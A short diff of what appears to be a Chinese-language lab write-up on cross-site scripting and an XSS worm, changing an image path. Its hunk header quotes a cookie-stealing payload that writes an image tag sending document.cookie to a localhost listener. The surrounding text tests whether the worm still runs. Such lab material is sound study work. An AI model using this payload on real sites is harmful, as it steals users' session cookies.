@@ -296,7 +296,7 @@ document.write('<img src=http://localhost:5555?c=' + escape(document.cookie) + '
 
 ![image-20240703184950986](img/image-20240703184950986.png)
 
-![image-20240626130120161](C:\Users\jessica\AppData\Roaming\Typora\typora-user-images\image-20240626130120161.png)
+![image-20240703201302884](img/image-20240703201302884.png)
 
 测试蠕虫病毒是否有效，观察到此时 JavaScript 脚本被解析为文本而非以脚
 
